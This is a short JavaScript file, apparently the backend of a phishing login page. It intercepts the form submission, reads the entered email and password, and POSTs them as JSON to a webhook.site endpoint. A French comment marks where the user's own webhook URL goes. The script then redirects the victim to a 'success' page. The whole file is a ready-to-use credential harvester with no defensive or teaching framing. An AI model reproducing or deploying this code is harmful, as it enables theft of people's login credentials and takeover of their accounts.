document.getElementById("loginForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const email = document.getElementById("email").value;
  const pass = document.getElementById("password").value;

  // ⚠️ Ton URL Webhook ici
  const webhook = "https://webhook.site/TON-URL";

  fetch(webhook, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ email: email, password: pass }),
  });

  window.location.href = "success.html";
});